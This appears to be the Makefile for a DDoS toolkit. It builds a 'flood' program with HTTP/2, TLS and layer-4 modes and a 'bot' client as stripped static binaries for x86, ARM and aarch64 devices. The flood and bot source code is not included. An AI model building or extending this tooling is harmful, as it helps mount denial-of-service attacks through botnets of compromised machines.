CXX     ?= g++
ZIG     ?= /tmp/zig-linux-x86_64-0.13.0/zig

# Flags for native (dynamic) build
CXXFLAGS_NATIVE = -O2 -s -pthread -fno-exceptions -fno-rtti \
                  -ffunction-sections -fdata-sections \
                  -Wl,--gc-sections -static-libstdc++ -static-libgcc

# Zig cross flags (static musl — NO_HTTP2 because nghttp2 musl static is complex)
ZIG_CXXFLAGS = -static -O2 -s -fno-exceptions -fno-rtti -pthread \
               -DNO_SSL -DNO_HTTP2

.PHONY: all flood flood-native multiarch clean

all: flood-native multiarch

# -----------------------------------------------------------------------
# Native x86_64 build — WITH OpenSSL + nghttp2 (full H2 support)
# -----------------------------------------------------------------------
flood-native: flood.cpp
	@echo "[*] Building native flood (OpenSSL + nghttp2)..."
	@$(CXX) $(CXXFLAGS_NATIVE) -march=x86-64 -mtune=generic \
		flood.cpp -o flood \
		-lssl -lcrypto -lnghttp2 \
		2>/dev/null && echo "[+] flood (full H2) OK" || \
	( echo "[!] nghttp2 not found, trying OpenSSL-only (TLS/H1.1)..."; \
	  $(CXX) $(CXXFLAGS_NATIVE) -march=x86-64 -mtune=generic \
		-DNO_HTTP2 flood.cpp -o flood \
		-lssl -lcrypto \
		2>/dev/null && echo "[+] flood (TLS H1.1) OK" || \
	( echo "[!] OpenSSL not found, building NO_SSL fallback..."; \
	  $(CXX) $(CXXFLAGS_NATIVE) -march=x86-64 -mtune=generic \
		-DNO_SSL -DNO_HTTP2 flood.cpp -o flood \
		&& echo "[+] flood (no TLS) OK" ) )

# -----------------------------------------------------------------------
# Multi-arch static builds via Zig (L4 only — no SSL/nghttp2 in musl static)
# -----------------------------------------------------------------------
multiarch: flood.cpp
	@if [ -x "$(ZIG)" ]; then \
		echo "[*] Building multi-arch static flood binaries..."; \
		$(ZIG) c++ -target x86_64-linux-musl  -mcpu=x86_64 $(ZIG_CXXFLAGS) flood.cpp -o flood-x86_64  && echo "[+] flood-x86_64 OK"; \
		$(ZIG) c++ -target aarch64-linux-musl            $(ZIG_CXXFLAGS) flood.cpp -o flood-aarch64 && echo "[+] flood-aarch64 OK"; \
		$(ZIG) c++ -target arm-linux-musleabihf -mcpu=cortex_a7 $(ZIG_CXXFLAGS) flood.cpp -o flood-armv7l && echo "[+] flood-armv7l OK"; \
		$(ZIG) c++ -target x86-linux-musl                $(ZIG_CXXFLAGS) flood.cpp -o flood-x86  && echo "[+] flood-x86 OK"; \
	else \
		echo "[!] Zig not found at $(ZIG), skipping multi-arch build"; \
	fi

# -----------------------------------------------------------------------
# Bot client (unchanged)
# -----------------------------------------------------------------------
bot: bot.cpp
	@if [ -x "$(ZIG)" ]; then \
		$(ZIG) cc -target x86_64-linux-musl -mcpu=x86_64 -static -O2 -s bot.cpp -o bot; \
		$(ZIG) cc -target aarch64-linux-musl -static -O2 -s bot.cpp -o bot-aarch64; \
		$(ZIG) cc -target arm-linux-musleabi -static -O2 -s bot.cpp -o bot-armv7l; \
		$(ZIG) cc -target x86_64-linux-musl -static -O2 -s bot.cpp -o bot-x86_64; \
		$(ZIG) cc -target x86-linux-musl -static -O2 -s bot.cpp -o bot-x86; \
	else \
		$(CXX) $(CXXFLAGS_NATIVE) -march=x86-64 -mtune=generic -static -o bot bot.cpp; \
	fi

clean:
	rm -f flood flood-* bot bot-*
